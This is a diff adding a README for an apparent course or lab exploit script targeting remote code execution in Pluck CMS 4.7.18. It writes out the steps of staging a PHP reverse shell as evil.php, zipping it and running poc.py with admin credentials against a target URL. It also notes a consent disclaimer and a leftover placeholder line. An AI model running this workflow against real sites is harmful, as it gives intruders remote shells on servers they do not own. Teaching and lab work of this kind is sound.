@@ -1,0 +1,60 @@
+#+title: Readme
+
+#+TITLE: Pluck CMS Exploitation Script
+#+AUTHOR: acnimda
+
+* TL:DR
+1. Create a revshell:
+   #+begin_src
+cp /usr/share/webshells/php/php-reverse-shell.php ~/path/to/your/likings/evil.php
+
+   #+end_src
+2. zip the revshell:
+   #+begin_src
+zip exploit.zip evil.php
+   #+end_src
+3. run =exp.py=.
+  #+BEGIN_SRC bash
+  python3 poc.py --url=example.nl -u admin -p admin123
+  #+END_SRC
+
+* Introduction
+  This Python script is developed for educational purposes as part of an university lecture series on cybersecurity and ethical hacking. It provides a practical demonstration of how to automate the process of exploiting a known remote code execution vulnerability in =Pluck CMS version 4.7.18=.
+
+* Dependencies
+  This script requires =Python3= and the following additional modules:
+  - requests: To handle HTTP requests
+  - requests_toolbelt: For multipart file upload support
+
+  You can install the required modules using pip:
+
+  #+BEGIN_SRC shell
+  pip install requests requests_toolbelt
+  #+END_SRC
+
+* Usage
+  Before running the script, ensure that you have permission to test the target application.
+
+  The script takes the following command-line arguments:
+  - -u, --username : The username for the login attempt
+  - -p, --password : The corresponding password
+  - --url : The base URL of the target Pluck CMS instance, e.g., "greenhorn.htb"
+
+  To run the script, use the following command:
+
+  #+BEGIN_SRC shell
+  python3 poc.py --url=example.com -u admin -p admin123
+  #+END_SRC
+
+  Make sure to replace =example.com=, =admin=, and =admin123= with the appropriate URL and credentials for your test scenario.
+
+* Disclaimer
+  The code provided in this script is for educational purposes only. As part of our academic integrity policy and ethical conduct, it is imperative that students and practitioners use this script in a controlled, legal, and ethical manner.
+
+  You must obtain explicit consent from the owners of any systems before running this script against them. Unauthorized use of this script may violate laws, and the author and the university disclaim any liability for misuse of this software. Instead, the aim is to educate students on the mechanisms of cybersecurity threats, defenses, and responsible disclosure practices.
+
+
+* Acknowledgments
+  Credit goes to all contributors and maintainers of the Pluck CMS project. The exploitation technique is based on existing research and has been adapted here for an educational setting. Students are encouraged to delve deeper into the code, understand the underlying security concepts, and contribute positively to the field of cybersecurity.
+
+Please replace the example email and any other placeholder content with actual information relevant to your situation.
